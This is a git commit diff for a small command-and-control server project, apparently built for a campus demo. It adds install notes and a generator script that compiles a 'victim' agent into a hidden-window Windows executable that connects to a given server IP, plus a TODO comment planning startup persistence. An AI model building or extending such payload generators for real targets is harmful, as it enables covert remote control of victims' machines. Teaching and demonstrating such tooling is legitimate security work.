60a43240d22e20d16a7ba20d12d1175a3b7d7457
Nick Rabon <nwrabon@gmail.com>
2022-04-05 10:01:31 -0400

    Added payload generation from windows

--- README.md
+++ README.md
@@ -1,2 +1,9 @@
 # CSOC-C2
 A simple C2 server to demo at Clemson Watt Center
+
+# Install
+pip install rich
+pip install flask
+pip install pyinstaller
+
+make sure pyinstaller is in PATH or payload generation will not work
--- client/generator.py
+++ client/generator.py
@@ -1,8 +1,13 @@
 from sys import platform
+import os
+import shutil
 
 import PyInstaller.__main__
 
+# pass in server ip and executable that connects
+# to server will be generated
 def generate_agent(serv_ip):
+    print(platform)
     with open('victim.py', 'r') as a:
         agent = a.read()
 
@@ -16,15 +21,22 @@ def generate_agent(serv_ip):
 
 
     if platform == 'linux':
-        #TODO use wine to generate windows executable
+        #TODO use wine to generate windows executable from linux
         pass
-    elif platform == 'windows':
-        #TODO generate payload normally
-        PyInstaller.__main__.run(['new_payload.py', '--noconsole',
-            '--distpath',
-            '..\\agents\\'
-            '--clean',
+    elif platform == 'win32':
+        PyInstaller.__main__.run([
+            'new_payload.py', 
+            '--noconsole',
             '-F',
+            '--distpath',
+            '../agents',
             '-n',
             'gen_agent.exe'
         ])
+
+    # cleans up unneeded files
+    os.remove('gen_agent.exe.spec')
+    shutil.rmtree('build')
+
+    # TODO make executable execute on start for persistence
+
